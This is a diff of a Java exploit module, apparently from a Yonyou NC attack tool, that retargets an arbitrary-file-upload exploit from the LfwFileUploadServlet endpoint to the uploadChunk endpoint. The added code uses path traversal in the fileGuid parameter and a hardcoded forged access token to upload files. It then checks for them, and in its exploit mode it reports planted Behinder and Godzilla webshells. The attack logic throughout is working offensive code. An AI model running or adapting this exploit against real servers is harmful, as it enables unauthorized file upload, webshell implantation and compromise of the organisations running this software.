@@ -14,18 +14,15 @@ import org.apache.http.client.methods.HttpPost;
 import org.apache.http.entity.ContentType;
 import org.apache.http.entity.mime.MultipartEntityBuilder;
 import org.apache.http.entity.mime.content.FileBody;
-import org.apache.http.entity.mime.content.StringBody;
 import org.apache.http.impl.client.CloseableHttpClient;
 import org.apache.http.impl.client.HttpClients;
-
 import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.util.Calendar;
 
-public class LfwFileUploadServlet_Upload extends VulnBase {
+public class UploadChunk_Upload extends VulnBase {
     public static boolean DNSLOG = false;
     public static boolean JNDI = false;
     public static boolean EXEC = false;
@@ -37,18 +34,17 @@ public class LfwFileUploadServlet_Upload extends VulnBase {
     private long timestamp = System.currentTimeMillis();
     private File file;
 
-    public LfwFileUploadServlet_Upload() {
+    public UploadChunk_Upload() {
     }
 
-    public LfwFileUploadServlet_Upload(TextArea log, TextArea uploadLog, TextArea execLog) {
+    public UploadChunk_Upload(TextArea log, TextArea uploadLog, TextArea execLog) {
         super(log, uploadLog, execLog);
     }
-
 
     @Override
     public void exploit() throws ClassNotFoundException, NoSuchFieldException, InstantiationException, IllegalAccessException, IOException {
         try {
-            String vulnerable_url = Config.TARGET + "/servlet/~ic/nc.uap.lfw.core.servlet.LfwFileUploadServlet";
+            String vulnerable_url = Config.TARGET + "/ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/&chunk=1&chunks=1";
 
             HttpHost proxy = null;
 
@@ -98,16 +94,14 @@ public class LfwFileUploadServlet_Upload extends VulnBase {
 
             // 构建MultipartEntity
             HttpEntity entity = MultipartEntityBuilder.create()
-                    .addPart("handler", new StringBody("upload_handler", org.apache.http.entity.ContentType.TEXT_PLAIN))
-                    .addPart("file", new FileBody(file, ContentType.TEXT_PLAIN ,"../yonyou/home/webapps/nc_web/" + fileName))
+                    .addPart("file", new FileBody(file, ContentType.MULTIPART_FORM_DATA, fileName))
                     .build();
 
             // 设置HttpPost的实体
             httpPost.setEntity(entity);
 
-            // 设置请求头
             httpPost.setHeader("User-Agent", "Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36");
-            httpPost.setHeader("Accept", "*/*");
+            httpPost.setHeader("accessTokenNcc", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ");
 
             // 执行请求并获取响应
             CloseableHttpResponse response = httpClient.execute(httpPost);
@@ -115,108 +109,64 @@ public class LfwFileUploadServlet_Upload extends VulnBase {
             // 获取状态码
             int responseCode1 = response.getStatusLine().getStatusCode();
 
-
-            String t = getTime();
-            String flag = t.substring(11, 14);
+            // 检测上传文件是否存在
             if (responseCode1 == HttpURLConnection.HTTP_OK) {
+                URL fileUrl = new URL(Config.TARGET + "/nccloud/" + fileName);
 
-                String var1 = "";
-                for(int i = Integer.parseInt(flag) - 5; i <= Integer.parseInt(flag) + 15; ++i) {
-                    var1 = "" + i;
-                    if (i < 100) {
-                        var1 = "0" + i;
+                HttpURLConnection conn2 = (HttpURLConnection) fileUrl.openConnection();
+
+                // 信任ssl证书
+                SSLUtil.trustAllCertificates();
+
+                // 设置全局代理
+                HttpProxy.setProxy();
+
+                // 设置超时
+                MyHttpUtil.setTimeout(conn2);
+
+                // get请求
+                MyHttpUtil.get(conn2);
+
+                int responseCode2 = MyHttpUtil.getResponseCode(conn2);
+                String responseText2 = MyHttpUtil.getResponseText(conn2);
+
+                if (responseCode2 == HttpURLConnection.HTTP_OK) {
+                    if (responseText2.contains(pocFlag) && Config.MOD.equals(Mod.POC)) {
+                        logMessage("[+] uploadChunk 文件上传漏洞存在! 成功上传测试文件: " + fileUrl);
+                        file.delete();
+                        return;
+                    } else if (!responseText2.contains(pocFlag) && Config.MOD.equals(Mod.POC)) {
+                        logMessage("[-] uploadChunk 文件上传漏洞不存在. 请尝试手动探测");
+                        file.delete();
+                        return;
+                    } else if (responseText2.contains(expFlag) && Config.MOD.equals(Mod.EXP)) {
+                        logMessage("[+] 文件上传成功! 同时写入回显/冰蝎/哥斯拉, 连接地址: " + fileUrl + "\n[+] 请求头与连接密码见 README.md.");
+                        file.delete();
+                        return;
+                    } else if (!responseText2.contains(expFlag) && Config.MOD.equals(Mod.EXP)) {
+                        logMessage("[-] uploadChunk 文件上传漏洞不存在. 请尝试手动探测");
+                        file.delete();
+                        return;
+                    } else if (Config.MOD.equals(Mod.UPLOAD)) {
+                        logUpload("[+] 文件上传成功! 文件地址: " + fileUrl);
+                        file.delete();
+                        return;
                     }
-
-                    String sub = t.substring(0, 11) + var1 + t.substring(14, 16);
-                    String full = fileName.substring(0, fileName.lastIndexOf(".") - 1) + "_" + sub + fileName.substring(fileName.lastIndexOf("."));
-
-                    URL fileUrl = new URL(Config.TARGET + "/" + full);
-                    HttpURLConnection conn2 = (HttpURLConnection) fileUrl.openConnection();
-
-                    // 信任ssl证书
-                    SSLUtil.trustAllCertificates();
-
-                    // 设置全局代理
-                    HttpProxy.setProxy();
-
-                    // 设置超时
-                    MyHttpUtil.setTimeout(conn2);
-
-                    // get请求
-                    MyHttpUtil.get(conn2);
-
-                    int responseCode2;
-                    String responseText2;
-
-                    try {
-                        // 获取响应代码 响应内容
-                        responseCode2 = MyHttpUtil.getResponseCode(conn2);
-                    } catch (Exception e) {
-                        continue;
-                    }
-
-
-                    if (responseCode2 == HttpURLConnection.HTTP_OK) {
-                        responseText2 = MyHttpUtil.getResponseText(conn2);
-                        if (responseText2.contains(pocFlag) && Config.MOD.equals(Mod.POC)) {
-                            logMessage("[+] LfwFileUploadServlet 文件上传漏洞存在! 成功上传测试文件: " + fileUrl);
-                            file.delete();
-                            return;
-                        } else if (!responseText2.contains(pocFlag) && Config.MOD.equals(Mod.POC)) {
-                            logMessage("[-] LfwFileUploadServlet 文件上传漏洞不存在. 请尝试手动探测");
-                            file.delete();
-                            return;
-                        } else if (responseText2.contains(expFlag) && Config.MOD.equals(Mod.EXP)) {
-                            logMessage("[+] 文件上传成功! 同时写入回显/冰蝎/哥斯拉, 连接地址: " + fileUrl + "\n[+] 请求头与连接密码见 README.md.");
-                            file.delete();
-                            return;
-                        } else if (!responseText2.contains(expFlag) && Config.MOD.equals(Mod.EXP)) {
-                            logMessage("[-] LfwFileUploadServlet 文件上传漏洞不存在. 请尝试手动探测");
-                            file.delete();
-                            return;
-                        } else if (Config.MOD.equals(Mod.UPLOAD)) {
-                            logUpload("[+] 文件上传成功! 文件地址: " + fileUrl);
-                            file.delete();
-                            return;
-                        }
-                    } else {
-                        continue;
-                    }
+                } else {
+                    noVul();
                 }
-
-                noVul();
-
             } else {
                 noVul();
             }
         } catch (Exception e) {
             noVul(e);
         }
-    }
 
-    private static String getTime() {
-        Calendar c = Calendar.getInstance();
-        String y = String.valueOf(c.get(1));
-        String m = getRealStringValue(c.get(2));
-        String d = getRealStringValue(c.get(5));
-        String h = getRealStringValue(c.get(10));
-        String mi = getRealStringValue(c.get(12));
-        String s = getRealStringValue(c.get(13));
-        String ms = getRealStringValue(14);
-        String time = y + m + d + h + mi + s + ms;
-        return time;
     }
-
-    private static String getRealStringValue(int value) {
-        String realValue = String.valueOf(value);
-        realValue = realValue.length() == 1 ? "0" + realValue : realValue;
-        return realValue;
-    }
-
 
     private void noVul(Exception... e) {
         if (Config.MOD.equals(Mod.POC) || Config.MOD.equals(Mod.EXP)) {
-            logMessage("[-] LfwFileUploadServlet 文件上传漏洞不存在, 请尝试手动探测. " + e);
+            logMessage("[-] uploadChunk 文件上传漏洞不存在, 请尝试手动探测. " + e);
             file.delete();
             return;
         } else if (Config.MOD.equals(Mod.UPLOAD)) {
